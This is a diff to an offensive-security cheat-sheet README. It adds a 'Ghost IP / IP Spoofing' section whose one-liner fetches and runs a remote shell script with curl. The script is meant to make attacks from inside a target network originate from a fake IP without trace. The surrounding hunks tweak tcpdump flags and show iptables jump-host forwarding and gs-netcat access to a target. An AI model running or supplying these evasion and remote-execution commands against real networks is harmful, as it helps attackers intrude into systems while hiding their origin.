@@ -35,6 +35,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [Raw TCP reverse ports](#ports)
       1. [HTTPS reverse forwards](#https)
       2. [Bouncing traffic with iptables](#iptables)
+      3. [Ghost IP / IP Spoofing](#ghost)
    1. [Use any tool via Socks Proxy](#scan-proxy)
    1. [Find your public IP address](#your-ip)
    1. [Check reachability from around the world](#check-reachable)
@@ -491,13 +492,13 @@ seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" |
 
 ```sh
 ## Monitor every new TCP connection
-tcpdump -n "tcp[tcpflags] == tcp-syn"
+tcpdump -np "tcp[tcpflags] == tcp-syn"
 
 ## Play a *bing*-noise for every new SSH connection
-tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
+tcpdump -nplq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
 
 ## Ascii output (for all large packets. Change to >40 if no TCP options are used).
-tcpdump -s0 -nAq 'tcp and (ip[2:2] > 60)'
+tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'
 ```
 
 ---
@@ -599,7 +600,7 @@ More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvese
 
 ---
 <a id="iptables"></a>
-**3.iii.c Bouncing traffic with iptables***
+**3.iii.c Bouncing traffic with iptables**
 
 Use the host 192.168.0.100 as a Jump-Host: Forward any connection from anywhere to 192.168.0.100:53 onwards to 1.2.3.4:443.
 ```sh
@@ -627,6 +628,20 @@ GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh
 # Access the target  
 GS_HOST=1.2.3.4: GS_PORT=443 gs-netcat -i -s ...
 ```
+
+---
+<a id="ghost"></a>
+**3.vi.c Ghsot IP / IP Spoofing**
+
+Useful on a host inside the target network. This tool re-configured (without trace) the SHELL: Any programm (nmap, cme, ...) started from this SHELL will use a fake IP. All your attacks will originate from a host that does not exist.
+
+```sh
+source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
+```
+
+This also works in combination with:
+ * [Segfault's ROOT Servers](https://thc.org/segfault/wg): Will connect your ROOT Server to the TARGET NETWORK and using a Ghost IP inside the taget network.
+ * [QEMU Tunnels](https://securelist.com/network-tunneling-with-qemu/111803/): As above, but less secure.
 
 ---
 <a id="scan-proxy"></a>
